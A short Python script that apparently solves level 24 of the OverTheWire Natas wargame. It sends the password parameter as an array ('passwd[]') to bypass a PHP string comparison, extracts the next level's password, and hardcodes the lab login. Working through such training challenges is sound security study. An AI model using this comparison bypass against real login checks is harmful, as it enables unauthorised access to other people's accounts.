#!/usr/local/bin/python3
import requests
import re
import codecs

username = "natas24"
password = "OsRmXFguozKpTZZ5X14zNO43379LZveg"

url = 'http://%s.natas.labs.overthewire.org/' % username

s = requests.session()

data = {"passwd[]": "wrong"}

response = s.get(url, params=data, auth=(username, password))
print(re.findall('Password: (.*)</pre', response.text)[0])
# print(response.text)
